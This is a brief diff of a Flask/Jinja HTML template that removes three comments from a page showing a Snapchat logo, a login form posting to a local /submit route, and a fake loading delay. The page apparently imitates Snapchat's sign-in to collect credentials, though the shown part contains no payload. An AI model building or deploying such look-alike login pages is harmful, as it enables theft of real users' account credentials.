@@ -7,10 +7,8 @@
   <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}" />
 </head>
 <body>
-  <!-- Loader with class -->
   <div class="loader"></div>
 
-  <!-- Main container hidden by default -->
   <div class="container" id="login-box" style="display:none;">
     <img src="{{ url_for('static', filename='snap-logo.png') }}" class="logo" alt="Snapchat Logo" />
     <form id="login-form" method="POST" action="/submit">
@@ -26,7 +24,6 @@
       const loader = document.querySelector('.loader');
       const container = document.querySelector('.container');
 
-      // Hide loader, show container after short delay (simulate loading)
       setTimeout(() => {
         loader.style.display = 'none';
         container.style.display = 'flex';
